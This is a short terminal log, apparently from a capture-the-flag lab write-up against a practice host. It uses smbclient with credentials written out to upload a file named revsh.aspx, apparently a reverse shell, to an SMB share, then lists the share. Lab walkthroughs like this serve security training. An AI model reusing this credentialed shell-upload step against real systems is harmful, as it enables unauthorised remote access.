
```sh
┌──(kali㉿kali)-[~]
└─$ cd shells

┌──(kali㉿kali)-[~/shells]
└─$ smbclient //relevant.thm/nt4wrksv -U 'Bob'%'!P@$$W0rD!123' -c 'put revsh.aspx' 
putting file revsh.aspx as \revsh.aspx (29.4 kb/s) (average 29.4 kb/s)

┌──(kali㉿kali)-[~/shells]
└─$ smbclient //relevant.thm/nt4wrksv -U 'Bob'%'!P@$$W0rD!123'                    
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Jul 25 18:14:16 2024
  ..                                  D        0  Thu Jul 25 18:14:16 2024
  passwords.txt                       A       98  Sat Jul 25 17:15:33 2020
  revsh.aspx                          A    15547  Thu Jul 25 18:14:16 2024

                7735807 blocks of size 4096. 4935823 blocks available
smb: \> 
```